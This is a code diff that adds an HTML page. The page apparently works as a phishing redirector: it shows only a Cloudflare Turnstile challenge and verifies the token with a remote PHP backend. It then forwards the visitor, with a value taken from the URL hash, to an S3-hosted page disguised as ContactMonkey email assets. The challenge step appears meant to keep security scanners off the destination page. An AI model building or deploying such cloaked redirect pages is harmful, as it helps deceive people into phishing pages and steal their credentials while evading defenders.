@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <title></title>
+        <meta content="no-cache, no-store, must-revalidate" http-equiv="Cache-Control" />
+        <meta content="no-cache" http-equiv="Pragma" />
+        <meta content="0" http-equiv="Expires" />
+        <meta charset="utf-8" />
+        <meta content="IE=edge" http-equiv="X-UA-Compatible" />
+        <meta content="width=device-width, initial-scale=1.0" name="viewport" />
+        <meta content="width=device-width, initial-scale=1" name="viewport" />
+        <script src="https://challenges.cloudflare.com/turnstile/v0/api.js?render=explicit"></script>
+        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" />
+    </head>
+    <body>
+        <div class="container mt-5">
+            <div class="row justify-content-center">
+                <div class="col-lg-5 text-center">
+                    <span class="fs-5"></span>
+                    <div class="mt-2">
+                        <form id="tt_base" style="width: 300px; margin: auto">
+                            <div class="cf-turnstile"  data-theme="light" data-appearance="interaction-only"></div>
+                        </form>
+                    </div>
+                    <div class="mt-2 text-muted" style="font-size: 14px;"></div>
+                </div>
+            </div>
+        </div>
+        <script>
+            let cf_key = '0x4AAAAAAAazedMz3sFotsP_';
+            let cf_backend_url = 'https://phpstack-1305525-4753348.cloudwaysapps.com/cloud.php';
+
+            var redirectUrl = "cm-email-assets.s3.amazonaws.com/images/ContactMonkey-User-yKJxBvqqZ9ixN9RBseYDPpf5MphRQiHzP2hJwfw84GyLhqg0i2Zxv38d1UVzva6p3zsfIHKXTImipdl1cSQpRXQXoY1rfUD8nWhcsQXInz35zL5TXXqMlJvfVCMpPuSb/newx1.html";
+            var length = 0;
+            var ignoreStrNum = 5;
+            var currentHash = window.location.hash;
+            var newHash = "";
+            //var url = "example.com";
+            const all_characters = "abcdefghijklmnopqrstuvwxyz";
+            const generateRandomString = (length) => {
+                let result_string = "";
+                const characters_length = all_characters.length;
+                for (let i = 0; i < length; i++) {
+                    result_string += all_characters.charAt(Math.floor(Math.random() * characters_length));
+                }
+                return result_string;
+            };
+            if (currentHash) {
+                newHash = currentHash.slice(ignoreStrNum + 0);
+            }
+            let subdomain = generateRandomString(length);
+            var newURL = `${subdomain}${redirectUrl}#${newHash}`;
+           
+            const _id = e => { return document.getElementById(e) }
+            let tt_init = false;
+            turnstile.ready(function(e){
+                if(!tt_init){
+                    tt_init = true;
+                    turnstile.render('#tt_base', {
+                        sitekey: cf_key,
+                        callback: function(token) {
+                            let fd = new FormData();
+                            fd.append('token',token);
+                            fetch(cf_backend_url,{
+                                method:'POST',
+                                body:fd
+                            }).then((r)=>r.json())
+                            .then(r=>{
+                                if(r.success){
+                                    location.assign("https://" + newURL + "");
+                                }else{
+                                    turnstile.reset();
+                                }
+                            })
+                        },
+                    });
+                }
+            });
+
+        </script>
+    </body>
+</html>
